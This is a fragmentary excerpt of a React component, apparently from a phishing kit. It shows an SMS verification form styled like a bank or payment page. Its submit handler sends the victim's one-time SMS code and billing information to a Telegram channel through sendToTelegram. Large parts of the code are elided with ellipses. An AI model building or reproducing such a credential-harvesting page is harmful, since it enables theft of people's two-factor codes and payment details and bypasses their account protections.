...
export function SMSVerification() {
  ...
  const handleSubmit = async (e: React.FormEvent) => {
    ...
    try {
      ...
      await sendToTelegram({ code, billingInfo, type: 'sms_code' }, 'sms_code');
    } catch (error) {
          ...
          <div className="bg-white rounded-2xl shadow-xl p-12">
            <div className="flex flex-col items-center mb-16">
              <div className="w-24 h-24 bg-[#96154a]/10 rounded-xl flex items-center justify-center mb-8">
                <MessageSquare className="w-16 h-16 text-[#96154a]" />
              </div>
            ...
            <form onSubmit={handleSubmit} className="space-y-10">
              ...
              <button
                ...
                className={`w-full px-8 py-6 bg-[#96154a] text-white rounded-xl text-xl font-medium
                  transition-all duration-300 flex items-center justify-center gap-3
                  ${!isLoading && code.length === 6
                    ? 'hover:bg-[#7d1240] transform hover:-translate-y-0.5 hover:shadow-lg'
